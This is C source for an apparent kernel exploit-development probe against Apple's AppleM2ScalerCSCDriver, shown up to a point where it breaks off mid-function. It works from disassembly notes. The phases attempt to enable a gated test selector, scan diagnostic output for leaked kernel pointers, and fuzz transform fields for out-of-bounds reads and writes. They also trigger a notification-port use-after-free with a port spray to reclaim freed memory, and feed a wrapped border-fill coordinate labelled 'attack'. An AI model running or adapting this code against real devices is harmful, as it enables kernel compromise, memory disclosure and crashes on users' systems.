// Target: AppleM2ScalerCSCDriver — probe v12 (kernel-reversing driven)
// Kernel side (macOS 27 kext disasm) established:
//  - sel 6 gate 0x2e2 = runtimeProperty "EnableKernelTests" (+0x18) == 0;
//    setProperties has NO permission checks -> try IORegistryEntrySetRegistryProperty.
//    args: +0 count (0x3e8 required by testStress), +4 surfaceIDs[count], +0xfa4 bit0=1.
//  - sel 1 +0x08..+0x18 = asyncRef (kernel-set), not user objects.
//  - registerNotificationPort override: no super, no retain on ipc_port_t,
//    no release in clientClose -> UAF candidate: deallocate port with
//    async transforms in flight -> sendAsyncResult64 on dangling port.
//  - sel 8 GetDiag returns raw kernel log_activity buffers (infoleak surface).
//  - crop/dst fixed16 -> fcvtzu without visible clamping in userclient layer.
// v12 phases:
//   P0 EnableKernelTests=1 via registry property
//   P1 sel 6 KernelTests with 1000 real surfaces (if ungated)
//   P2 GetDiag full dump + kernel-pointer scan
//   P3 fixed16 extreme fuzz on sel 1
//   P4 notification port UAF attempts (LAST - may panic)
//   P5 steady fuzz if alive
#include "fuzz.h"
#include <IOSurface/IOSurfaceRef.h>
#include <sys/mman.h>
#include <stdarg.h>

// exported by iOS IOKit binary but marked unavailable in SDK headers
extern kern_return_t set_cf_property_ios(io_registry_entry_t entry,
                                         CFStringRef key, CFTypeRef value)
    __asm("_IORegistryEntrySetCFProperty");

static mach_port_t g_wake, g_notify;

static void *msg_listener(void *arg) {
    mach_port_t port = (mach_port_t)(uintptr_t)arg;
    struct { mach_msg_header_t h; uint8_t data[0x400]; } msg;
    for (;;) {
        kern_return_t kr = mach_msg(&msg.h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    sizeof(msg), port, 1000, MACH_PORT_NULL);
        if (kr == MACH_RCV_TIMED_OUT) continue;
        if (kr) { LOG("[rx 0x%x] err 0x%x", port, kr); continue; }
        uint32_t *d = (uint32_t *)&msg;
        LOG("[rx 0x%x] MSG id 0x%x size %u: %08x %08x %08x %08x | %08x %08x %08x %08x",
            port, msg.h.msgh_id, msg.h.msgh_size,
            d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13]);
    }
    return NULL;
}

static IOSurfaceRef make_surface_fmt(int w, int h, int bpe, int fmt) {
    CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    CFNumberRef F = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
    const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
    const void *vals[] = { W, H, B, F };
    CFDictionaryRef props = CFDictionaryCreate(NULL, keys, vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    IOSurfaceRef s = IOSurfaceCreate(props);
    CFRelease(props); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(F);
    return s;
}
static IOSurfaceRef make_surface(int w, int h) {
    return make_surface_fmt(w, h, 4, 0x42475241);
}

static io_connect_t g_conn;
static IOSurfaceRef g_sf1, g_sf2;
static uint8_t *g_req, *g_out, *g_hist, *g_estout, *g_coeffs;
static IOSurfaceID g_s1, g_s2;
static IOSurfaceID *g_ids; static int g_nids;

static void hexdump(const char *tag, const uint8_t *p, size_t n) {
    for (size_t i = 0; i < n; i += 16)
        LOG("%s +%03zx: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
            tag, i, p[i], p[i+1], p[i+2], p[i+3], p[i+4], p[i+5], p[i+6], p[i+7],
            p[i+8], p[i+9], p[i+10], p[i+11], p[i+12], p[i+13], p[i+14], p[i+15]);
}

static void craft_transform(uint8_t *r, IOSurfaceID src, IOSurfaceID dst, int w, int h) {
    memset(r, 0, 0x1b0);
    *(uint32_t *)(r + 0x00) = src;
    *(uint32_t *)(r + 0x04) = dst;
    *(uint64_t *)(r + 0x20) = 0x3000 | (1ULL << 15);
    *(uint64_t *)(r + 0x38) = (uint64_t)w << 16;
    *(uint64_t *)(r + 0x40) = (uint64_t)h << 16;
    *(uint32_t *)(r + 0x48) = w;
    *(uint32_t *)(r + 0x4c) = h;
    *(uint32_t *)(r + 0x68) = w;
    *(uint32_t *)(r + 0x6c) = h;
    *(uint32_t *)(r + 0x70) = w;
    *(uint32_t *)(r + 0x74) = h;
}

static kern_return_t call_struct(uint32_t sel, const void *in, size_t insz,
                                 void *out, size_t *outsz) {
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallMethod(g_conn, sel, NULL, 0, in, insz, osc, &nosc, out, outsz);
}

static kern_return_t call_async1(const void *in, void *out, size_t outsz, uint64_t ref) {
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    return IOConnectCallAsyncMethod(g_conn, 1, g_wake, &ref, 1,
                                    NULL, 0, in, 0x1b0, osc, &nosc, out, &outsz);
}

// P0: try to lift the KernelTests gate via registry property
static int p0_enable_tests(void) {
    LOG("[v12-0] EnableKernelTests attempt");
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                        IOServiceMatching("AppleM2ScalerCSCDriver"));
    if (!svc) { LOG("[p0] service not found"); return 0; }
    int one = 1;
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &one);
    kern_return_t kr = set_cf_property_ios(svc, CFSTR("EnableKernelTests"), n);
    LOG("[p0] SetCFProperty EnableKernelTests=1 -> 0x%08x", kr);
    CFTypeRef val = IORegistryEntryCreateCFProperty(svc, CFSTR("EnableKernelTests"), NULL, 0);
    LOG("[p0] readback: %s", val ? "present" : "absent");
    if (val) CFRelease(val);
    // also try boolean
    if (kr != 0) {
        kr = set_cf_property_ios(svc, CFSTR("EnableKernelTests"), kCFBooleanTrue);
        LOG("[p0] retry with boolean -> 0x%08x", kr);
    }
    CFRelease(n);
    IOObjectRelease(svc);
    // probe sel 6 quickly
    memset(g_req, 0, 0xfa8);
    *(uint32_t *)g_req = 1;
    g_req[0xfa4] = 1;
    kern_return_t k6 = call_struct(6, g_req, 0xfa8, NULL, NULL);
    LOG("[p0] sel 6 probe -> 0x%08x (%s)", k6, k6 == 0xe00002e2 ? "still gated" : "CHANGED");
    return k6 != 0xe00002e2;
}

// P1: KernelTests with 1000 surfaces
static void p1_kerneltests(void) {
    LOG("[v12-1] KernelTests with real surfaces");
    g_ids = malloc(1000 * sizeof(IOSurfaceID));
    g_nids = 0;
    for (int i = 0; i < 1000; i++) {
        IOSurfaceRef s = make_surface(64, 64);
        if (!s) { LOG("[p1] surface create failed at %d", i); break; }
        g_ids[g_nids++] = IOSurfaceGetID(s);   // intentionally leak refs
        if ((i & 0x7f) == 0) usleep(1000);
    }
    LOG("[p1] created %d surfaces [%u..%u]", g_nids, g_ids[0], g_ids[g_nids-1]);
    if (g_nids < 1000) { LOG("[p1] not enough surfaces, skip"); return; }
    memset(g_req, 0, 0xfa8);
    *(uint32_t *)g_req = 0x3e8;
    memcpy(g_req + 4, g_ids, 1000 * 4);
    g_req[0xfa4] = 1;
    LOG("[p1] sel 6 count=0x3e8 GO");
    kern_return_t kr = call_struct(6, g_req, 0xfa8, NULL, NULL);
    LOG("[p1] sel 6 -> 0x%08x (device survived)", kr);
    usleep(5000000);
    LOG("[p1] post-wait alive");
}

// P2: GetDiag full dump + pointer scan (kernel-side len can reach ~40KB)
static void p2_diag_leak(void) {
    LOG("[v12-2] GetDiag dump + pointer scan (64KB buffer)");
    size_t bufsz = 0x10000;
    uint8_t *big = must_map(bufsz);
    memset(big, 0, bufsz);
    *(uint32_t *)big = 0x6944506b;
    uint64_t va = (uint64_t)(uintptr_t)big;
    kern_return_t kr = call_struct(8, &va, 8, NULL, NULL);
    LOG("[p2] sel 8 -> 0x%08x", kr);
    hexdump("[p2]", big, 0x100);
    int found = 0;
    size_t lastnz = 0;
    for (size_t i = 0; i + 8 <= bufsz; i += 8) {
        uint64_t v = *(uint64_t *)(big + i);
        if (v) lastnz = i;
        if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff || (v >> 40) == 0xfffffd) {
            LOG("[p2] ptr-like @+0x%zx: %016llx", i, v);
            if (++found > 30) break;
        }
    }
    LOG("[p2] ptr-like count: %d, last nonzero qword @+0x%zx", found, lastnz);
    vm_deallocate(mach_task_self(), (vm_address_t)big, bufsz);
}

// P3: fixed16 extremes on sel 1
static void p3_fixed16(void) {
    LOG("[v12-3] fixed16 extreme fuzz");
    static const uint64_t ex[] = {
        0, 1, 0xffff, 0x10000, 0x7fffffff, 0x80000000ULL, 0xffffffffULL,
        0x100000000ULL, 0xffffffffffffffffULL, 0x00007fff00000000ULL,
        0x400000000000ULL, 0xffff00000000ULL
    };
    for (unsigned i = 0; i < sizeof(ex)/8; i++) {
        for (int field = 0; field < 4; field++) {
            craft_transform(g_req, g_s1, g_s2, 64, 64);
            *(uint64_t *)(g_req + 0x28 + field * 8) = ex[i];
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
                LOG("[p3] ex[%u]=%016llx field %d -> kr 0x%08x", i, ex[i], field, kr);
        }
    }
    // dst rect raw extremes
    for (unsigned i = 0; i < sizeof(ex)/8; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint64_t *)(g_req + 0x60) = ex[i];
        *(uint64_t *)(g_req + 0x68) = ex[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[p3] dstrect ex[%u]=%016llx -> kr 0x%08x", i, ex[i], kr);
    }
    // dims extremes
    static const uint32_t dims[] = { 0, 1, 0x4000, 0x8000, 0x10000, 0x7fffffff, 0xffffffff };
    for (unsigned i = 0; i < sizeof(dims)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x70) = dims[i];
        *(uint32_t *)(g_req + 0x74) = dims[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[p3] dim %08x -> kr 0x%08x", dims[i], kr);
    }
    LOG("[v12-3] done");
}

// P4: notification port UAF. LAST - may panic the device.
// Each attempt uses a FRESH connection: register a fresh port, submit async
// transforms on big surfaces, destroy the port while requests are in flight,
// then spray new ports to reclaim the freed ipc_port_t.
static void p4_port_uaf(void) {
    LOG("[v12-4] notification port UAF attempts (panic tolerated)");
    IOSurfaceRef big1 = make_surface(2048, 2048);
    IOSurfaceRef big2 = make_surface(2048, 2048);
    if (!big1 || !big2) { LOG("[uaf] big surfaces failed"); return; }
    for (int attempt = 0; attempt < 30; attempt++) {
        io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
        if (!c2) { LOG("[uaf] open failed at %d", attempt); break; }
        mach_port_t p;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        kern_return_t kr = IOConnectSetNotificationPort(c2, 0, p, 0);
        if (kr) LOG("[uaf] attempt %d SetNotificationPort -> 0x%08x", attempt, kr);
        craft_transform(g_req, IOSurfaceGetID(big1), IOSurfaceGetID(big2), 2048, 2048);
        int submitted = 0;
        for (int i = 0; i < 32; i++) {
            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
            uint64_t ref = 0xface0000 + i;
            memset(g_out, 0xAA, 0x2000);
            size_t osz = 0x2000;
            kern_return_t k2 = IOConnectCallAsyncMethod(c2, 1, g_wake, &ref, 1,
                                                        NULL, 0, g_req, 0x1b0,
                                                        osc, &nosc, g_out, &osz);
            if (k2 == 0xe00002bf || k2 == 0) submitted++;
        }
        // destroy the port while completions are pending
        mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
        // reclaim: spray fresh ports into the freed slot
        mach_port_t spray[64];
        for (int i = 0; i < 64; i++)
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray[i]))
                break;
        usleep(200000);
        for (int i = 0; i < 64; i++) mach_port_destroy(mach_task_self(), spray[i]);
        IOServiceClose(c2);
        LOG("[uaf] attempt %d done, submitted %d", attempt, submitted);
    }
    CFRelease(big1); CFRelease(big2);
    LOG("[v12-4] done (still alive)");
}

// V14: empirical verification — does an oversize-declared transform actually
// execute (dst content changes) or get silently dropped? Also re-tests the
// same-format 0x2c2 anomaly on a completely fresh state.
static void surf_fill(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) { LOG("[v] lock failed"); return; }
    memset(IOSurfaceGetBaseAddress(s), v, IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static uint32_t surf_sum(IOSurfaceRef s, int rows) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) { LOG("[v] rlock failed"); return 0; }
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t bpr = IOSurfaceGetBytesPerRow(s);
    uint32_t sum = 0;
    for (int r = 0; r < rows; r++)
        for (size_t i = 0; i < bpr; i++) sum += b[r * bpr + i];
    LOG("[v] readback bpr %zu sum(%d rows) 0x%08x first %02x%02x%02x%02x",
        bpr, rows, sum, b[0], b[1], b[2], b[3]);
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return sum;
}
static void p_v14_verify(void) {
    LOG("[v14] verify phase (fresh state)");
    IOSurfaceRef A = make_surface(64, 64);
    IOSurfaceRef B = make_surface(64, 64);
    if (!A || !B) { LOG("[v] surface fail"); return; }
    // 1) same-format normal transform, fresh state
    surf_fill(A, 0x11); surf_fill(B, 0x22);
    surf_sum(A, 4); surf_sum(B, 4);
    craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(B), 64, 64);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[v] normal 64x64 same-fmt -> kr 0x%08x", kr);
    surf_sum(B, 4);
    // 2) oversize-declared transform
    surf_fill(B, 0x22);
    uint32_t before = surf_sum(B, 4);
    craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(B), 64, 64);
    *(uint32_t *)(g_req + 0x70) = 4096;
    *(uint32_t *)(g_req + 0x74) = 4096;
    *(uint32_t *)(g_req + 0x68) = 4096;
    *(uint32_t *)(g_req + 0x6c) = 4096;
    kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[v] oversize dst 4096 -> kr 0x%08x", kr);
    uint32_t after = surf_sum(B, 4);
    LOG("[v] dst changed: %s (before 0x%08x after 0x%08x)",
        before != after ? "YES - executed" : "NO - dropped/clamped", before, after);
    // 3) cross-format sanity on fresh pair
    IOSurfaceRef Y = make_surface_fmt(64, 64, 1, 0x34323076);
    if (Y) {
        surf_fill(Y, 0x33);
        craft_transform(g_req, IOSurfaceGetID(A), IOSurfaceGetID(Y), 64, 64);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] BGRA->420v fresh -> kr 0x%08x", kr);
        surf_sum(Y, 4);
    }
    // 4) g_s1 -> g_s2 for continuity with v10/v11
    if (g_sf1) {
        surf_fill(g_sf1, 0x44);
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] g_s1->g_s2 -> kr 0x%08x", kr);
    }
    // 5) sticky-state repro: same-fmt -> oversize -> same-fmt
    {
        IOSurfaceRef C = make_surface(64, 64);
        IOSurfaceRef D = make_surface(64, 64);
        IOSurfaceID c = IOSurfaceGetID(C), d = IOSurfaceGetID(D);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k1 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        *(uint32_t *)(g_req + 0x70) = 4096;
        *(uint32_t *)(g_req + 0x74) = 4096;
        *(uint32_t *)(g_req + 0x68) = 4096;
        *(uint32_t *)(g_req + 0x6c) = 4096;
        kern_return_t k2 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k3 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        usleep(50000);
        craft_transform(g_req, c, d, 64, 64);
        kern_return_t k4 = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[v] sticky repro: normal 0x%08x -> oversize 0x%08x -> normal 0x%08x -> normal 0x%08x",
            k1, k2, k3, k4);
    }
    LOG("[v14] done");
}

// state probe: fresh same-format transform on given connection
static kern_return_t state_probe(io_connect_t conn) {
    IOSurfaceRef C = make_surface(64, 64);
    IOSurfaceRef D = make_surface(64, 64);
    if (!C || !D) return KERN_FAILURE;
    uint8_t *req = must_map(0x1000);
    craft_transform(req, IOSurfaceGetID(C), IOSurfaceGetID(D), 64, 64);
    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
    kern_return_t kr = IOConnectCallMethod(conn, 1, NULL, 0, req, 0x1b0, osc, &nosc, NULL, NULL);
    vm_deallocate(mach_task_self(), (vm_address_t)req, 0x1000);
    return kr;
}
static void state_check(const char *tag) {
    kern_return_t k1 = state_probe(g_conn);
    io_connect_t c2 = open_service("AppleM2ScalerCSCDriver", 0);
    kern_return_t k2 = c2 ? state_probe(c2) : (kern_return_t)-1;
    if (c2) IOServiceClose(c2);
    LOG("[state] %s: same-conn 0x%08x, fresh-conn 0x%08x", tag, k1, k2);
}

static void p3b_boundary(void) {
    LOG("[v13-b] boundary sweep (declared dims vs real 64x64 surfaces)");
    static const uint32_t dcl[] = { 63, 64, 65, 96, 128, 256, 1024, 4096, 0x10000 };
    // 1) declared src dims larger than surface -> OOB read?
    for (unsigned i = 0; i < sizeof(dcl)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x48) = dcl[i];      // src w declared
        *(uint32_t *)(g_req + 0x4c) = dcl[i];      // src h declared
        *(uint64_t *)(g_req + 0x38) = (uint64_t)dcl[i] << 16;  // crop w
        *(uint64_t *)(g_req + 0x40) = (uint64_t)dcl[i] << 16;  // crop h
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[b] src declared %u -> kr 0x%08x", dcl[i], kr);
        usleep(2000);
        if (dcl[i] == 64 || dcl[i] == 4096) state_check("after-src-decl");
    }
    state_check("after-src-loop");
    // 2) declared dst dims larger than surface -> OOB write?
    for (unsigned i = 0; i < sizeof(dcl)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint32_t *)(g_req + 0x70) = dcl[i];
        *(uint32_t *)(g_req + 0x74) = dcl[i];
        *(uint32_t *)(g_req + 0x68) = dcl[i];
        *(uint32_t *)(g_req + 0x6c) = dcl[i];
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[b] dst declared %u -> kr 0x%08x", dcl[i], kr);
        usleep(2000);
        if (dcl[i] == 64 || dcl[i] == 4096) state_check("after-dst-decl");
    }
    state_check("after-dst-loop");
    // 3) crop origin beyond surface edge
    static const uint32_t org[] = { 63, 64, 65, 128, 4096, 0x8000 };
    for (unsigned i = 0; i < sizeof(org)/4; i++) {
        craft_transform(g_req, g_s1, g_s2, 64, 64);
        *(uint64_t *)(g_req + 0x28) = (uint64_t)org[i] << 16;  // crop x
        *(uint64_t *)(g_req + 0x30) = (uint64_t)org[i] << 16;  // crop y
        kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        if (kr != 0 && kr != 0xe00002c2 && kr != 0xe00002f0)
            LOG("[b] crop origin %u -> kr 0x%08x", org[i], kr);
        usleep(2000);
    }
    state_check("after-crop-loop");
    LOG("[v13-b] done");
}

// P3c: pixel-format confusion matrix
static void p3c_formats(void) {
    LOG("[v13-c] pixel-format confusion matrix");
    static const struct { int fmt; int bpe; const char *name; } fmts[] = {
        { 0x42475241, 4, "BGRA" },
        { 0x52474241, 4, "RGBA" },
        { 0x34323076, 1, "420v" },
        { 0x34323066, 1, "420f" },
        { 0x4c303872, 2, "L08r?" },
    };
    IOSurfaceID ids[5] = {0};
    for (int i = 0; i < 5; i++) {
        IOSurfaceRef s = make_surface_fmt(64, 64, fmts[i].bpe, fmts[i].fmt);
        if (s) ids[i] = IOSurfaceGetID(s);
        LOG("[c] surface %s -> id %u", fmts[i].name, ids[i]);
    }
    for (int a = 0; a < 5; a++) {
        if (!ids[a]) continue;
        for (int b = 0; b < 5; b++) {
            if (!ids[b]) continue;
            craft_transform(g_req, ids[a], ids[b], 64, 64);
            kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
            LOG("[c] %s -> %s : kr 0x%08x", fmts[a].name, fmts[b].name, kr);
            usleep(2000);
        }
    }
    LOG("[v13-c] done");
}

// P4b: UAF destroy-first variant. LAST - may panic the device.

// V16: candidate A — validateBorderFill 32-bit wraparound (MSR23 0x9880584):
//   check: selX+selW (32-bit wrap) <= realW; selX>0 keeps wrapped result.
//   selX=0xFFFFFFFE, selW=2 -> sum wraps to 0 -> passes; consumer writes
//   border fill at skewed rect. Requires crop_right + selW <= realW, so
//   crop is narrowed to real-2. Readback scan shows where writes landed.
static void surf_fill_full(IOSurfaceRef s, uint8_t v) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, 0, &seed)) return;
    memset(IOSurfaceGetBaseAddress(s), v,
           IOSurfaceGetBytesPerRow(s) * IOSurfaceGetHeight(s));
    IOSurfaceUnlock(s, 0, &seed);
}
static int surf_scan(IOSurfaceRef s, uint8_t expect, const char *tag) {
    uint32_t seed = 0;
    if (IOSurfaceLock(s, kIOSurfaceLockReadOnly, &seed)) { LOG("[A] rlock fail"); return -1; }
    uint8_t *b = IOSurfaceGetBaseAddress(s);
    size_t bpr = IOSurfaceGetBytesPerRow(s);
    size_t h = IOSurfaceGetHeight(s);
    int changed = 0;
    for (size_t r = 0; r < h && changed < 8; r++)
        for (size_t i = 0; i < bpr; i++)
            if (b[r * bpr + i] != expect) {
                LOG("[A] %s changed @row %zu col %zu: %02x (expect %02x)",
                    tag, r, i, b[r * bpr + i], expect);
                changed++;
                break;
            }
    IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, &seed);
    return changed;
}

static void border_payload(uint8_t *r, IOSurfaceID src, IOSurfaceID dst,
                           uint32_t selX, uint32_t selY, uint32_t selW, uint32_t selH,
                           uint32_t dstRW, uint32_t dstRH) {
    craft_transform(r, src, dst, 64, 64);
    *(uint64_t *)(r + 0x38) = 62ULL << 16;   // crop w/h
    *(uint64_t *)(r + 0x40) = 62ULL << 16;
    *(uint32_t *)(r + 0x68) = dstRW;         // dst rect w/h (must satisfy dstW+W<=bufW)
    *(uint32_t *)(r + 0x6c) = dstRH;
    *(uint64_t *)(r + 0x20) |= (1ULL << 28); // BorderFill present
    *(uint32_t *)(r + 0xac) = selX;
    *(uint32_t *)(r + 0xb0) = selY;
    *(uint32_t *)(r + 0xb4) = selW;
    *(uint32_t *)(r + 0xb8) = selH;
    *(uint32_t *)(r + 0xbc) = 0xff;          // alpha: 2^n-1 valid
    *(uint32_t *)(r + 0xc0) = 0xff;          // R/Y:  2^n-1 valid
    *(uint32_t *)(r + 0xc4) = 0xff;          // G/Cb
    *(uint32_t *)(r + 0xc8) = 0xff;          // B/Cr
}

static void p_borderfill(void) {
    LOG("[v18-A] border fill probes (iOS validation mapped)");
    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[A] surface fail"); return; }
    IOSurfaceID si = IOSurfaceGetID(src), di = IOSurfaceGetID(dst);

    // baseline: dst rect 32x32 in 64x64 buffer, border 2,2 2x2 -> all checks pass
    surf_fill_full(dst, 0x22);
    border_payload(g_req, si, di, 2, 2, 2, 2, 32, 32);
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[A] baseline dstrect32 border 2,2 2x2 -> kr 0x%08x", kr);
    usleep(100000);
    if (kr == 0) surf_scan(dst, 0x22, "baseline");
    if (kr != 0) {
        // second baseline: 32-aligned W/H (align gate?) — X=2 Y=2 W=H=32, dstrect 32
        surf_fill_full(dst, 0x22);
        border_payload(g_req, si, di, 2, 2, 32, 32, 32, 32);
        kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
        LOG("[A] baseline2 32-aligned -> kr 0x%08x", kr);
        usleep(100000);
        if (kr == 0) surf_scan(dst, 0x22, "baseline2");
        if (kr != 0) { LOG("[A] border path gated on this HW (0x2c7)"); return; }
    }

    LOG("[v18-A] done (kill-shots moved to p_spray_oob)");
}

// V16: candidate B — extended-pixel +1 beyond real dims on full-frame 420
static void p_extpixel(void) {
    LOG("[v16-B] extended-pixel 420 full-frame probe");
    IOSurfaceRef src = make_surface_fmt(64, 64, 1, 0x34323066); // 420f
    IOSurfaceRef dst = make_surface_fmt(64, 64, 1, 0x34323066);
    if (!src || !dst) { LOG("[B] 420f surface fail"); return; }
    surf_fill_full(dst, 0x33);
    craft_transform(g_req, IOSurfaceGetID(src), IOSurfaceGetID(dst), 64, 64);
    // full-frame crop (already 64x64 by craft_transform)
    kern_return_t kr = call_struct(1, g_req, 0x1b0, NULL, NULL);
    LOG("[B] 420f full-frame -> kr 0x%08x", kr);
    usleep(100000);
    surf_scan(dst, 0x33, "420f-fullframe");
    LOG("[v16-B] done");
}


// V17: drive the REAL IOSurfaceAccelerator API with hostile option values.
// Framework builds a guaranteed-valid 0x1b0 request; we supply a wrapped
// BorderFillX so the kernel-side 32-bit add in validateBorderFill wraps.
#include <dlfcn.h>
typedef IOReturn (*CreateFn)(CFAllocatorRef, CFDictionaryRef, void **);
typedef IOReturn (*TransformFn)(void *, IOSurfaceRef, IOSurfaceRef,
                                CFDictionaryRef, void *, void *);
static CFStringRef kstr(void *h, const char *name) {
    CFStringRef *p = (CFStringRef *)dlsym(h, name);
    return p ? *p : NULL;
}
static void p_realapi(void) {
    LOG("[v17] real API path");
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
    if (!h) { LOG("[r] dlopen failed: %s", dlerror()); return; }
    CreateFn Create = (CreateFn)dlsym(h, "IOSurfaceAcceleratorCreate");
    TransformFn Transform = (TransformFn)dlsym(h, "IOSurfaceAcceleratorTransformSurface");
    LOG("[r] Create %p Transform %p", Create, Transform);
    if (!Create || !Transform) return;

    IOSurfaceRef src = make_surface(64, 64);
    IOSurfaceRef dst = make_surface(64, 64);
    if (!src || !dst) { LOG("[r] surfaces fail"); return; }
    void *acc = NULL;
    IOReturn kr = Create(NULL, NULL, &acc);
    LOG("[r] Create -> 0x%08x acc %p", kr, acc);
    if (kr || !acc) return;

    CFStringRef kX = kstr(h, "kIOSurfaceAcceleratorBorderFillX");
    CFStringRef kY = kstr(h, "kIOSurfaceAcceleratorBorderFillY");
    CFStringRef kW = kstr(h, "kIOSurfaceAcceleratorBorderFillWidth");
    CFStringRef kH = kstr(h, "kIOSurfaceAcceleratorBorderFillHeight");
    CFStringRef kR = kstr(h, "kIOSurfaceAcceleratorBorderFillRedY");
    CFStringRef kG = kstr(h, "kIOSurfaceAcceleratorBorderFillGreenCb");
    CFStringRef kB = kstr(h, "kIOSurfaceAcceleratorBorderFillBlueCr");
    LOG("[r] keys %p %p %p %p %p %p %p", kX, kY, kW, kH, kR, kG, kB);
    if (!kX || !kY || !kW || !kH || !kR || !kG || !kB) return;

    uint8_t rects[0x30]; memset(rects, 0, sizeof(rects));   // zero rects = valid

    int bx = 2, by = 2, bw = 2, bh = 2, col = 128;
    CFNumberRef nX = CFNumberCreate(NULL, kCFNumberIntType, &bx);
    CFNumberRef nY = CFNumberCreate(NULL, kCFNumberIntType, &by);
    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &bw);
    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &bh);
    CFNumberRef nC = CFNumberCreate(NULL, kCFNumberIntType, &col);

    // baseline: small valid border fill
    {
        const void *keys[] = { kX, kY, kW, kH, kR, kG, kB };
        const void *vals[] = { nX, nY, nW, nH, nC, nC, nC };
        CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 7,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        surf_fill_full(dst, 0x22);
        kr = Transform(acc, src, dst, opts, rects, NULL);
        LOG("[r] baseline borderfill -> 0x%08x", kr);
        usleep(100000);
        surf_scan(dst, 0x22, "real-baseline");
        CFRelease(opts);
    }
    // attack: wrapped X
    {
        int wx = 0xFFFFFFFE;   // y stays 2 (> 0 transform offset)
        CFNumberRef nWX = CFNumberCreate(NULL, kCFNumberIntType, &wx);
        const void *keys[] = { kX, kY, kW, kH, kR, kG, kB };
        const void *vals[] = { nWX, nY, nW, nH, nC, nC, nC };
        CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 7,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        surf_fill_full(dst, 0x22);
        kr = Transform(acc, src, dst, opts, rects, NULL);
        LOG("[r] wrapped X=0xFFFFFFFE -> 0x%08x", kr);
        usleep(100000);
        if (!kr) surf_scan(dst, 0x22, "real-wrapX");
        CFRelease(opts);
        CFRelease(nWX);
    }
    // geometry isolation: Transform with NULL options, rect variants
    {
        uint8_t rz[0x30]; memset(rz, 0, sizeof(rz));
        kr = Transform(acc, src, dst, NULL, rz, NULL);
